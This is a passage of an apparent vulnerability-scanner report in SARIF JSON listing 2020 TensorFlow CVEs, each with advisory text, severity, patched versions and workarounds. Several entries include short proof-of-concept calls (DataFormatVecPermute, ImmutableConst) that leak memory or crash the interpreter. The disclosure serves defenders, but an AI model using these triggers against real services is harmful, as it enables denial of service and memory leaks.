              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15210",
              "help": {
                "text": "Vulnerability CVE-2020-15210\nSeverity: high\nFixed Version: 1.15.4\nLink: [CVE-2020-15210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15210)\n### Impact\nIf a TFLite saved model uses the same tensor as both input and output of an operator, then, depending on the operator, we can observe a segmentation fault or just memory corruption.\n\n### Patches\nWe have patched the issue in d58c96946b and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### Workarounds\nA potential workaround would be to add a custom `Verifier` to the model loading code to ensure that no operator reuses tensors as both inputs and outputs. Care should be taken to check all types of inputs (i.e., constant or variable tensors as well as optional tensors).\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been discovered from a variant analysis of [GHSA-cvpc-8phh-8f45](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvpc-8phh-8f45).",
                "markdown": "**Vulnerability CVE-2020-15210**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.15.4|[CVE-2020-15210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15210)|\n\n### Impact\nIf a TFLite saved model uses the same tensor as both input and output of an operator, then, depending on the operator, we can observe a segmentation fault or just memory corruption.\n\n### Patches\nWe have patched the issue in d58c96946b and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### Workarounds\nA potential workaround would be to add a custom `Verifier` to the model loading code to ensure that no operator reuses tensors as both inputs and outputs. Care should be taken to check all types of inputs (i.e., constant or variable tensors as well as optional tensors).\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been discovered from a variant analysis of [GHSA-cvpc-8phh-8f45](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvpc-8phh-8f45)."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-15204",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15204"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15204",
              "help": {
                "text": "Vulnerability CVE-2020-15204\nSeverity: medium\nFixed Version: 1.15.4\nLink: [CVE-2020-15204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15204)\n### Impact\nIn eager mode, TensorFlow does not set the session state. Hence, calling `tf.raw_ops.GetSessionHandle` or `tf.raw_ops.GetSessionHandleV2` results in a null pointer dereference:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/session_ops.cc#L45\n\nIn the above snippet, in eager mode, `ctx-\u003esession_state()` returns `nullptr`. Since code immediately dereferences this, we get a segmentation fault.\n\n### Patches\nWe have patched the issue in 9a133d73ae4b4664d22bd1aa6d654fec13c52ee1 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15204**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.4|[CVE-2020-15204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15204)|\n\n### Impact\nIn eager mode, TensorFlow does not set the session state. Hence, calling `tf.raw_ops.GetSessionHandle` or `tf.raw_ops.GetSessionHandleV2` results in a null pointer dereference:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/session_ops.cc#L45\n\nIn the above snippet, in eager mode, `ctx-\u003esession_state()` returns `nullptr`. Since code immediately dereferences this, we get a segmentation fault.\n\n### Patches\nWe have patched the issue in 9a133d73ae4b4664d22bd1aa6d654fec13c52ee1 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-15208",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-15208"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15208",
              "help": {
                "text": "Vulnerability CVE-2020-15208\nSeverity: high\nFixed Version: 1.15.4\nLink: [CVE-2020-15208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15208)\n### Impact\nWhen determining the common dimension size of two tensors, TFLite uses a `DCHECK` which is no-op outside of debug compilation modes:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/types.h#L437-L442\n\nSince the function always returns the dimension of the first tensor, malicious attackers can craft cases where this is larger than that of the second tensor. In turn, this would result in reads/writes outside of bounds since the interpreter will wrongly assume that there is enough data in both tensors.\n\n### Patches\nWe have patched the issue in 8ee24e7949a20 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-15208**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.15.4|[CVE-2020-15208](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15208)|\n\n### Impact\nWhen determining the common dimension size of two tensors, TFLite uses a `DCHECK` which is no-op outside of debug compilation modes:\nhttps://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/lite/kernels/internal/types.h#L437-L442\n\nSince the function always returns the dimension of the first tensor, malicious attackers can craft cases where this is larger than that of the second tensor. In turn, this would result in reads/writes outside of bounds since the interpreter will wrongly assume that there is enough data in both tensors.\n\n### Patches\nWe have patched the issue in 8ee24e7949a20 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2020-26267",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-26267"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26267",
              "help": {
                "text": "Vulnerability CVE-2020-26267\nSeverity: low\nFixed Version: 1.15.5\nLink: [CVE-2020-26267](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26267)\n### Impact\nThe `tf.raw_ops.DataFormatVecPermute` API does not validate the `src_format` and `dst_format` attributes. [The code](https://github.com/tensorflow/tensorflow/blob/304b96815324e6a73d046df10df6626d63ac12ad/tensorflow/core/kernels/data_format_ops.cc) assumes that these two arguments define a permutation of `NHWC`.\n\nHowever, these assumptions are not checked and this can result in uninitialized memory accesses, read outside of bounds and even crashes.\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format=`1234`, dst_format=`1234`)\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 757100143], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format=`HHHH`, dst_format=`WWWW`)\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format=`H`, dst_format=`W`)\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], \n                                    src_format=`1234`, dst_format=`1253`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 2, 939037184, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format=`1234`, dst_format=`1223`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 32701, 2, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format=`1224`, dst_format=`1423`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([1, 4, 3, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format=`1234`, dst_format=`432`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 3, 2, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format=`12345678`, dst_format=`87654321`)\nmunmap_chunk(): invalid pointer\nAborted\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],           \n                                    src_format=`12345678`, dst_format=`87654321`)\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[71364624,        0],\n       [71365824,        0],\n       [     560,        0],\n       [      48,        0]], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]], \n                                    src_format=`12345678`, dst_format=`87654321`)\nfree(): invalid next size (fast)\nAborted\n```\n\nA similar issue occurs in `tf.raw_ops.DataFormatDimMap`, for the same reasons:\n\n```python\n\u003e\u003e\u003e tf.raw_ops.DataFormatDimMap(x=[[1,5],[2,6],[3,7],[4,8]], src_format=`1234`,\n\u003e\u003e\u003e dst_format=`8765`)\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [1852793632, 1852793632]], dtype=int32)\u003e\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ebc70b7a592420d3d2f359e4b1694c236b82c7ae](https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-26267**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|1.15.5|[CVE-2020-26267](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26267)|\n\n### Impact\nThe `tf.raw_ops.DataFormatVecPermute` API does not validate the `src_format` and `dst_format` attributes. [The code](https://github.com/tensorflow/tensorflow/blob/304b96815324e6a73d046df10df6626d63ac12ad/tensorflow/core/kernels/data_format_ops.cc) assumes that these two arguments define a permutation of `NHWC`.\n\nHowever, these assumptions are not checked and this can result in uninitialized memory accesses, read outside of bounds and even crashes.\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format=`1234`, dst_format=`1234`)\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 757100143], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format=`HHHH`, dst_format=`WWWW`)\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format=`H`, dst_format=`W`)\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], \n                                    src_format=`1234`, dst_format=`1253`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 2, 939037184, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format=`1234`, dst_format=`1223`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 32701, 2, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format=`1224`, dst_format=`1423`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([1, 4, 3, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format=`1234`, dst_format=`432`)\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 3, 2, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format=`12345678`, dst_format=`87654321`)\nmunmap_chunk(): invalid pointer\nAborted\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],           \n                                    src_format=`12345678`, dst_format=`87654321`)\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[71364624,        0],\n       [71365824,        0],\n       [     560,        0],\n       [      48,        0]], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]], \n                                    src_format=`12345678`, dst_format=`87654321`)\nfree(): invalid next size (fast)\nAborted\n```\n\nA similar issue occurs in `tf.raw_ops.DataFormatDimMap`, for the same reasons:\n\n```python\n\u003e\u003e\u003e tf.raw_ops.DataFormatDimMap(x=[[1,5],[2,6],[3,7],[4,8]], src_format=`1234`,\n\u003e\u003e\u003e dst_format=`8765`)\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [1852793632, 1852793632]], dtype=int32)\u003e\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ebc70b7a592420d3d2f359e4b1694c236b82c7ae](https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2020-26266",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-26266"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26266",
              "help": {
                "text": "Vulnerability CVE-2020-26266\nSeverity: medium\nFixed Version: 1.15.5\nLink: [CVE-2020-26266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26266)\n### Impact\nUnder certain cases, a saved model can trigger use of uninitialized values during code execution. This is caused by having tensor buffers be filled with the default value of the type but forgetting to [default initialize the quantized floating point types in Eigen](https://github.com/tensorflow/tensorflow/blob/f70160322a579144950dff1537dcbe3c7c09d6f5/third_party/eigen3/unsupported/Eigen/CXX11/src/FixedPoint/FixedPointTypes.h#L61-L104):\n\n```cc\nstruct QUInt8 {\n  QUInt8() {}\n  // ...\n  uint8_t value;\n};\n\nstruct QInt16 {\n  QInt16() {}\n  // ...\n  int16_t value;\n};\n\nstruct QUInt16 {\n  QUInt16() {}\n  // ...\n  uint16_t value;\n};\n\nstruct QInt32 {\n  QInt32() {}\n  // ...\n  int32_t value;\n};\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2](https://github.com/tensorflow/tensorflow/commit/ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2020-26266**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.5|[CVE-2020-26266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26266)|\n\n### Impact\nUnder certain cases, a saved model can trigger use of uninitialized values during code execution. This is caused by having tensor buffers be filled with the default value of the type but forgetting to [default initialize the quantized floating point types in Eigen](https://github.com/tensorflow/tensorflow/blob/f70160322a579144950dff1537dcbe3c7c09d6f5/third_party/eigen3/unsupported/Eigen/CXX11/src/FixedPoint/FixedPointTypes.h#L61-L104):\n\n```cc\nstruct QUInt8 {\n  QUInt8() {}\n  // ...\n  uint8_t value;\n};\n\nstruct QInt16 {\n  QInt16() {}\n  // ...\n  int16_t value;\n};\n\nstruct QUInt16 {\n  QUInt16() {}\n  // ...\n  uint16_t value;\n};\n\nstruct QInt32 {\n  QInt32() {}\n  // ...\n  int32_t value;\n};\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2](https://github.com/tensorflow/tensorflow/commit/ace0c15a22f7f054abcc1f53eabbcb0a1239a9e2) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-26270",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-26270"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26270",
              "help": {
                "text": "Vulnerability CVE-2020-26270\nSeverity: medium\nFixed Version: 1.15.5\nLink: [CVE-2020-26270](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26270)\n### Impact\nRunning an LSTM/GRU model where the LSTM/GRU layer receives an input with zero-length results in a `CHECK` failure when using the CUDA backend.\n\nThis can result in a query-of-death vulnerability, via denial of service, if users can control the input to the layer.\n\n### Patches\nWe have patched the issue in GitHub commit [14755416e364f17fb1870882fa778c7fec7f16e3](https://github.com/tensorflow/tensorflow/commit/14755416e364f17fb1870882fa778c7fec7f16e3) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2020-26270**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.5|[CVE-2020-26270](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26270)|\n\n### Impact\nRunning an LSTM/GRU model where the LSTM/GRU layer receives an input with zero-length results in a `CHECK` failure when using the CUDA backend.\n\nThis can result in a query-of-death vulnerability, via denial of service, if users can control the input to the layer.\n\n### Patches\nWe have patched the issue in GitHub commit [14755416e364f17fb1870882fa778c7fec7f16e3](https://github.com/tensorflow/tensorflow/commit/14755416e364f17fb1870882fa778c7fec7f16e3) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-26271",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-26271"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26271",
              "help": {
                "text": "Vulnerability CVE-2020-26271\nSeverity: medium\nFixed Version: 1.15.5\nLink: [CVE-2020-26271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26271)\n### Impact\nUnder certain cases, loading a saved model can result in accessing uninitialized memory while building the computation graph. The [`MakeEdge` function](https://github.com/tensorflow/tensorflow/blob/3616708cb866365301d8e67b43b32b46d94b08a0/tensorflow/core/common_runtime/graph_constructor.cc#L1426-L1438) creates an edge between one output tensor of the `src` node (given by `output_index`) and the input slot of the `dst` node (given by `input_index`). This is only possible if the types of the tensors on both sides coincide, so the function begins by obtaining the corresponding `DataType` values and comparing these for equality:\n\n```cc\n  DataType src_out = src-\u003eoutput_type(output_index);\n  DataType dst_in = dst-\u003einput_type(input_index);\n  //...\n```\n\nHowever, there is no check that the indices point to inside of the arrays they index into. Thus, this can result in accessing data out of bounds of the corresponding heap allocated arrays.\n\nIn most scenarios, this can manifest as unitialized data access, but if the index points far away from the boundaries of the arrays this can be used to leak addresses from the library.\n\n### Patches\nWe have patched the issue in GitHub commit [0cc38aaa4064fd9e79101994ce9872c6d91f816b](https://github.com/tensorflow/tensorflow/commit/0cc38aaa4064fd9e79101994ce9872c6d91f816b) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2020-26271**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.5|[CVE-2020-26271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26271)|\n\n### Impact\nUnder certain cases, loading a saved model can result in accessing uninitialized memory while building the computation graph. The [`MakeEdge` function](https://github.com/tensorflow/tensorflow/blob/3616708cb866365301d8e67b43b32b46d94b08a0/tensorflow/core/common_runtime/graph_constructor.cc#L1426-L1438) creates an edge between one output tensor of the `src` node (given by `output_index`) and the input slot of the `dst` node (given by `input_index`). This is only possible if the types of the tensors on both sides coincide, so the function begins by obtaining the corresponding `DataType` values and comparing these for equality:\n\n```cc\n  DataType src_out = src-\u003eoutput_type(output_index);\n  DataType dst_in = dst-\u003einput_type(input_index);\n  //...\n```\n\nHowever, there is no check that the indices point to inside of the arrays they index into. Thus, this can result in accessing data out of bounds of the corresponding heap allocated arrays.\n\nIn most scenarios, this can manifest as unitialized data access, but if the index points far away from the boundaries of the arrays this can be used to leak addresses from the library.\n\n### Patches\nWe have patched the issue in GitHub commit [0cc38aaa4064fd9e79101994ce9872c6d91f816b](https://github.com/tensorflow/tensorflow/commit/0cc38aaa4064fd9e79101994ce9872c6d91f816b) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2020-26268",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2020-26268"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26268",
              "help": {
                "text": "Vulnerability CVE-2020-26268\nSeverity: medium\nFixed Version: 1.15.5\nLink: [CVE-2020-26268](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26268)\n### Impact\nThe `tf.raw_ops.ImmutableConst` operation returns a constant tensor created from a memory mapped file which is assumed immutable. However, if the type of the tensor is not an integral type, the operation crashes the Python interpreter as it tries to write to the memory area:\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e with open(`/tmp/test.txt`,`w`) as f: f.write(`a`*128)\n\u003e\u003e\u003e tf.raw_ops.ImmutableConst(dtype=tf.string,shape=2,\n                              memory_region_name=`/tmp/test.txt`)\n```\n\nIf the file is too small, TensorFlow properly returns an error as the memory area has fewer bytes than what is needed for the tensor it creates. However, as soon as there are enough bytes, the above snippet causes a segmentation fault.\n\nThis is because the alocator used to return the buffer data is not marked as returning an opaque handle since the [needed virtual method](https://github.com/tensorflow/tensorflow/blob/c1e1fc899ad5f8c725dcbb6470069890b5060bc7/tensorflow/core/framework/typed_allocator.h#L78-L85) is [not overriden](https://github.com/tensorflow/tensorflow/blob/acdf3c04fcfa767ae8d109b9e1f727ef050dba4d/tensorflow/core/kernels/immutable_constant_op.cc).\n\n### Patches\nWe have patched the issue in GitHub commit [c1e1fc899ad5f8c725dcbb6470069890b5060bc7](https://github.com/tensorflow/tensorflow/commit/c1e1fc899ad5f8c725dcbb6470069890b5060bc7) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2020-26268**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.15.5|[CVE-2020-26268](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26268)|\n\n### Impact\nThe `tf.raw_ops.ImmutableConst` operation returns a constant tensor created from a memory mapped file which is assumed immutable. However, if the type of the tensor is not an integral type, the operation crashes the Python interpreter as it tries to write to the memory area:\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e with open(`/tmp/test.txt`,`w`) as f: f.write(`a`*128)\n\u003e\u003e\u003e tf.raw_ops.ImmutableConst(dtype=tf.string,shape=2,\n                              memory_region_name=`/tmp/test.txt`)\n```\n\nIf the file is too small, TensorFlow properly returns an error as the memory area has fewer bytes than what is needed for the tensor it creates. However, as soon as there are enough bytes, the above snippet causes a segmentation fault.\n\nThis is because the alocator used to return the buffer data is not marked as returning an opaque handle since the [needed virtual method](https://github.com/tensorflow/tensorflow/blob/c1e1fc899ad5f8c725dcbb6470069890b5060bc7/tensorflow/core/framework/typed_allocator.h#L78-L85) is [not overriden](https://github.com/tensorflow/tensorflow/blob/acdf3c04fcfa767ae8d109b9e1f727ef050dba4d/tensorflow/core/kernels/immutable_constant_op.cc).\n\n### Patches\nWe have patched the issue in GitHub commit [c1e1fc899ad5f8c725dcbb6470069890b5060bc7](https://github.com/tensorflow/tensorflow/commit/c1e1fc899ad5f8c725dcbb6470069890b5060bc7) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security 